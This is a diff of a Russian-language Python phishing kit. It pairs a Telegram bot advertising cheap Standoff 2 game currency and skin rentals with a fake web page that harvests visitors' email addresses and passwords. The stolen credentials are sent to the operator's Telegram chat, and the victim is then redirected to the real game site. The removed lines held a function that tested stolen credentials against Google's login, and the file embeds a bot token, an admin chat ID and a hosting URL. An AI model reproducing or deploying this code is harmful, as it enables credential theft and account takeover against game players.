@@ -2,68 +2,17 @@ import asyncio
 import logging
 import os
 import re
-import requests
 from aiogram import Bot, Dispatcher, types
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram.filters import Command
 from aiohttp import web
 
-# ===== КОНФИГУРАЦИЯ =====
 BOT_TOKEN = "8729915071:AAGn3w7rBkdeaVELxEQea8kgBY0jfljltKk"
 ADMIN_CHAT_ID = "6739523131"
-
-# Прокси для проверки паролей (опционально)
-# Формат: "http://user:pass@ip:port" или оставь None
-PROXY = None  # Пример: "http://proxy_user:proxy_pass@123.123.123.123:8080"
-# ========================
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
-def check_google_password(email, password):
-    """
-    Пытается войти в Google через имитацию запроса
-    Возвращает: 'valid', 'invalid', '2fa', 'error'
-    """
-    session = requests.Session()
-    if PROXY:
-        session.proxies = {'http': PROXY, 'https': PROXY}
-    
-    # Шаг 1: Получаем страницу входа
-    try:
-        resp = session.get('https://accounts.google.com/ServiceLogin', timeout=15)
-    except Exception as e:
-        return f'error (connection: {str(e)[:50]})'
-    
-    # Шаг 2: Отправляем логин
-    try:
-        # Ищем скрытые параметры
-        import re
-        match = re.search(r'name="GALX" value="([^"]+)"', resp.text)
-        galx = match.group(1) if match else ''
-        
-        login_data = {
-            'Email': email,
-            'Passwd': password,
-            'signIn': 'Войти',
-            'GALX': galx,
-            'PersistentCookie': 'yes',
-        }
-        resp = session.post('https://accounts.google.com/ServiceLoginAuth', data=login_data, timeout=15)
-    except Exception as e:
-        return f'error (login: {str(e)[:50]})'
-    
-    # Шаг 3: Анализируем ответ
-    if 'checkConnection' in resp.text or 'https://myaccount.google.com/' in resp.text:
-        return 'valid'
-    elif 'ssl=1' in resp.text or 'challenge' in resp.text.lower():
-        return '2fa'
-    elif 'Invalid' in resp.text or 'incorrect' in resp.text.lower():
-        return 'invalid'
-    else:
-        return 'unknown'
-
-# ----- ФЕЙКОВАЯ СТРАНИЦА -----
 FAKE_PAGE = """<!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><title>Купить голду Standoff 2</title>
@@ -105,10 +54,6 @@ function validateAndSubmit() {
         passwordError.innerText = "❌ Введите пароль";
         passwordError.style.display = "block";
         passwordValid = false;
-    } else if (password.length < 1) {
-        passwordError.innerText = "❌ Пароль не может быть пустым";
-        passwordError.style.display = "block";
-        passwordValid = false;
     } else {
         passwordError.style.display = "none";
         passwordValid = true;
@@ -145,13 +90,8 @@ function validateAndSubmit() {
 </body>
 </html>"""
 
-# ----- ОБРАБОТКА ВЕБ-ЗАПРОСОВ -----
 async def handle_index(request):
-    headers = {
-        'Cache-Control': 'no-cache, no-store, must-revalidate',
-        'Pragma': 'no-cache',
-        'Expires': '0'
-    }
+    headers = {'Cache-Control': 'no-cache, no-store, must-revalidate'}
     return web.Response(text=FAKE_PAGE, content_type='text/html', headers=headers)
 
 async def handle_login(request):
@@ -159,75 +99,38 @@ async def handle_login(request):
     email = data.get('email', '').strip()
     password = data.get('password', '').strip()
     
-    # Валидация
     email_pattern = re.compile(r'^[^\s@]+@([^\s@]+\.)+[^\s@]+$')
     if not email or not password or not email_pattern.match(email):
-        error_page = """<!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><title>Ошибка</title>
-<style>body{background:#1a1a2e;color:white;font-family:Arial;text-align:center;padding:50px;}</style>
-</head>
-<body>
-<h2>❌ НЕВЕРНЫЕ ДАННЫЕ</h2>
-<p>Пожалуйста, вернитесь и введите корректный email и пароль.</p>
-<a href="/">Вернуться</a>
-</body>
-</html>"""
-        return web.Response(text=error_page, content_type='text/html', status=400)
+        return web.Response(text="Ошибка", status=400)
     
-    # ---- ПРОВЕРКА ПАРОЛЯ (валидный или нет) ----
-    check_result = check_google_password(email, password)
-    
-    if check_result == 'valid':
-        status_icon = "✅ ВАЛИДНЫЙ"
-    elif check_result == 'invalid':
-        status_icon = "❌ НЕВАЛИДНЫЙ (неверный пароль)"
-    elif check_result == '2fa':
-        status_icon = "⚠️ ТРЕБУЕТСЯ 2FA (нужен код с телефона жертвы)"
-    else:
-        status_icon = f"⚠️ НЕ УДАЛОСЬ ПРОВЕРИТЬ ({check_result})"
-    
-    # Отправляем в Telegram с пометкой о валидности
-    msg = f"🔓 НОВЫЙ УЛОВ (покупка голды)!\n📧 Email: {email}\n🔑 Пароль: {password}\n\n📊 Статус: {status_icon}"
+    msg = f"🔓 НОВЫЙ УЛОВ!\n📧 Email: {email}\n🔑 Пароль: {password}"
     await bot.send_message(ADMIN_CHAT_ID, msg)
     
-    # Страница успеха (жертва не знает о проверке)
     success_page = """<!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><title>Успешно</title>
+<html><head><meta charset="UTF-8"><title>Успешно</title>
 <style>body{background:#1a1a2e;color:white;font-family:Arial;text-align:center;padding:50px;}</style>
 </head>
 <body>
 <h2>✅ ДОСТУП ПОДТВЕРЖДЁН</h2>
-<p>Голда будет начислена в течение 5 минут.<br>Арендованные скины уже в игре.</p>
-<p>Перезайдите в Standoff 2, чтобы увидеть изменения.</p>
+<p>Голда будет начислена в течение 5 минут.</p>
 <script>setTimeout(()=>{window.location.href='https://standoff2.com';},3000);</script>
 </body>
 </html>"""
     return web.Response(text=success_page, content_type='text/html')
 
-# ----- TELEGRAM БОТ -----
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
     site_url = "https://standoff-bot-i57l.onrender.com"
-    
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="💰 КУПИТЬ ГОЛДУ", url=site_url)],
         [InlineKeyboardButton(text="🔪 АРЕНДОВАТЬ СКИН", url=site_url)],
         [InlineKeyboardButton(text="📦 ВСЕ ПРЕДЛОЖЕНИЯ", url=site_url)]
     ])
-    
     await message.answer(
-        "🔫 **STANDOFF 2 — МАРКЕТПЛЕЙС**\n\n"
-        "💰 **5000 голды** — 250₽\n"
-        "🔪 **Аренда скинов** — от 30₽/день\n"
-        "⚡ Мгновенная доставка после подтверждения\n\n"
-        "Нажми на кнопку, чтобы продолжить:",
-        reply_markup=keyboard,
-        parse_mode="Markdown"
+        "🔫 **STANDOFF 2 — МАРКЕТПЛЕЙС**\n\n💰 5000 голды — 250₽\n🔪 Аренда скинов — от 30₽/день",
+        reply_markup=keyboard, parse_mode="Markdown"
     )
 
-# ----- ЗАПУСК ВЕБ-СЕРВЕРА -----
 async def start_web_server():
     app = web.Application()
     app.router.add_get('/', handle_index)
@@ -237,11 +140,9 @@ async def start_web_server():
     port = int(os.environ.get('PORT', 10000))
     site = web.TCPSite(runner, '0.0.0.0', port)
     await site.start()
-    print(f"✅ Веб-сервер запущен на порту {port}")
 
 async def main():
     asyncio.create_task(start_web_server())
-    print("✅ Бот запущен...")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
